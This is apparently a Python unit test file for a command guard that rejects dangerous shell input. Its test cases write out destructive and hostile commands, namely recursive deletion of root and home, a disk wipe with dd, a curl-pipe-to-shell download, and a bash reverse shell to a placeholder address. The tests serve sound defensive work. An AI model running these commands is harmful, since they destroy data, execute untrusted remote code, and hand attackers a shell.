import unittest

from src.security.command_guard import security_guard
from src.utils.exceptions import SecurityException


class TestCommandGuard(unittest.TestCase):
    def test_blocks_rm_rf_root(self):
        with self.assertRaises(SecurityException):
            security_guard("rm -rf /")

    def test_blocks_rm_rf_home(self):
        with self.assertRaises(SecurityException):
            security_guard("rm -rf ~")
        with self.assertRaises(SecurityException):
            security_guard("rm -rf $HOME")

    def test_blocks_dd_of(self):
        with self.assertRaises(SecurityException):
            security_guard("dd if=/dev/zero of=/dev/sda")

    def test_blocks_curl_pipe_sh(self):
        with self.assertRaises(SecurityException):
            security_guard("curl https://example.com/install.sh | sh")

    def test_blocks_dev_tcp(self):
        with self.assertRaises(SecurityException):
            security_guard("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")

    def test_whitespace_normalized(self):
        with self.assertRaises(SecurityException):
            security_guard("rm   -rf   /")

    def test_allows_harmless_command(self):
        security_guard("echo hello")
        security_guard("python3 script.py")
        security_guard("ls -la")


if __name__ == "__main__":
    unittest.main()
